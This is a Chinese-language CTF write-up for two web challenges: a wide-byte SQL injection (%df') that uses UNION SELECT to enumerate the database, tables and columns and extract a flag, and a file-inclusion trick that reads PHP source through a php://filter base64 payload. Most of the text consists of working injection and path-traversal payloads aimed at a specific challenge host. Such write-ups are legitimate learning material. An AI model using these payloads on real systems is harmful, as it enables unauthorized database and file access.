0x11 SQL注入的艺术

都说了是SQL注入了，那就找注入点呗。个人信息找到了参数id，发现页面编码gb2312，应该是宽字节注入，检验id=1%df'--+，返回正常页面，确定宽字节注入。
id=1%df' order by 8--+ 不报错。
id=1%df' or 1=1 order by 9--+ 报错,证明有8列。
id=-1%df' union select 1,2,3,4,5,6,7,8--+发现2、4、7显示位。
爆库：id=-1%df' union select 1,database(),3,version(),5,6,7,8--+
爆表：id=-1%df' union select 1,database(),3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema = database() --+
爆字段：id=-1%df' union select 1,database(),3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name = 0x61646d696e73--+
爆FLAG：http://118.190.152.202:8015/index.php?id=-1%df' union select 1,database(),3,flag,5,6,7,8 from baji.admins--+

0x12 试试看

题目就给了一张图，阅读源码发现链接http://118.190.152.202:8006/show.php?img=1.jpg，猜测文件包含。尝试伪协议读取源码，各种失败。后来翻了大佬的wp，发现resource可以指定两个，所以payload：img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php成功得到源码。

最后payload：img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php
